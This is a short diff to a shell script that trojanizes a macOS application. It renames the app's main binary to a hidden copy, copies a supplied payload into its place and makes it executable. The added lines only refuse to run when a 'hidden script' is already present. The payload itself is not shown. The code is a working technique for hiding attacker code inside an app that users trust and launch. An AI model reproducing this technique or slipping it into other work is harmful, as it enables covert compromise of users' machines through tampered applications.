@@ -28,6 +28,9 @@ echo "Info.plist @ $info"
 echo "MacOS directory @ $macos"
 echo "Binary @ $binary"
 
+if [[ -f "${binary}_" ]]; then
+    fail "There is already a hidden script inside this application!"
+fi
 mv "$binary" "${binary}_"
 cp "$payload" "$binary"
 chmod +x "$binary"
